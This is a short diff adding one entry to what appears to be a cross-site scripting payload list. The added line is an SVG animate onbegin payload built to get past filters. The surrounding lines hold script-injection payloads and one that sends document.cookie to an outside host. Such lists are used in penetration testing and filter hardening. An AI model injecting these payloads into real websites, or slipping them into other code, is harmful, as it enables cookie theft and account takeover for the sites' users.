@@ -90,6 +90,7 @@ open(“//a/”+document.cookie)
 “<script>alert(1)</script>
 “;alert(1)//
 ‘-alert(1)-’
+"><svg><animate onbegin=prompt(document.domain) attributeName=x dur=1s>
 
 document.location
 document.URL
